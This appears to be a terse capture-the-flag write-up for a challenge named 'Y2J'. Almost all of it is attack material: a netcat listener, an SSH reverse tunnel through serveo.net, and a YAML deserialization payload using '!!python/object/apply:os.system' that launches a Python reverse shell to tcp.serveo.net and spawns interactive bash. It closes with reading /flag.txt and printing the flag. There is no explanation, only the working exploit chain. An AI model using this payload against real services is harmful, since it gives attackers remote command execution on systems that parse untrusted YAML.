## Y2J

`nc -lvnp PORT`
`ssh -R PORT:localhost:PORT serveo.net`

```yaml
!!python/object/apply:os.system
args: ["python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"tcp.serveo.net\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'"]
```

```
user@Y2J:/$ cat /flag.txt
flag{b20870a1955ac22377045e3b2dcb832a}
```
